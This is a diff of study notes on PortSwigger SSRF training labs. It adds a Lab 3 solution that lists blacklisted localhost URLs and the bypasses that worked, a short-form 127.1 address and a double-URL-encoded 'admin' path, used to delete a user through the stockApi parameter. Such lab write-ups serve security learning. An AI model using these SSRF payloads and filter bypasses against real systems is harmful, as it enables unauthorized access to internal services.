@@ -12,7 +12,20 @@
 - Try deleting carlos user > Observe the requested URL > Pass it to `stockApi=http://localhost/admin/delete?username=carlos` > User is deleted now.
 
 # Lab 3: [SSRF with blacklist-based input filter](https://portswigger.net/academy/labs/launch/f97f7df5a96da8563edc18e5544b8ef962f8ee47abd9b9bb3d30706f15bff341?referrer=%2fweb-security%2fssrf%2flab-ssrf-with-blacklist-filter)
-- 
+- SSRF with blacklist-based input filters:
+```
+Blacklisted:
+http://127.0.0.1/
+http://localhost/
+http://127.1/admin
+```
+
+```
+Worked:
+http://127.1/ >> http://127.0.0.1/
+http://127.1/admin >> Double url Encode 'a' to work
+```
+- Try deleting carlos user > Observe the requested URL > Pass it to `stockApi=...` > User is deleted now.
 
 # Lab 4: []()
 
